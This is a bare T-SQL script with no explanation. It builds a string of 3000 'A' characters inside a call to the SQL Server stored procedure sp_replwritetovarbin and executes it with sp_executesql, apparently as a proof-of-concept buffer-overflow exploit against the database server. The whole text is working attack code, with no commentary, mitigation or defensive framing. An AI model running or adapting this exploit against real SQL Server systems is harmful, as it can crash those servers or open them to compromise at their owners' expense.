DECLARE @buf NVARCHAR(4000), 
@val NVARCHAR(4), 
@counter INT

SET @buf = '
declare @retcode int, 
@end_offset int, 
@vb_buffer varbinary,
@vb_bufferlen int, 
@buf nvarchar;
exec master.dbo.sp_replwritetovarbin 1, 
  @end_offset output, 
  @vb_buffer output,
  @vb_bufferlen output,'''

SET @val = CHAR(0x41)

SET @counter = 0
WHILE @counter < 3000
BEGIN
  SET @counter = @counter + 1
  SET @buf = @buf + @val
END

SET @buf = @buf + ''',''1'',''1'',''1'',
''1'',''1'',''1'',''1'',''1'',''1'''

EXEC master..sp_executesql @buf
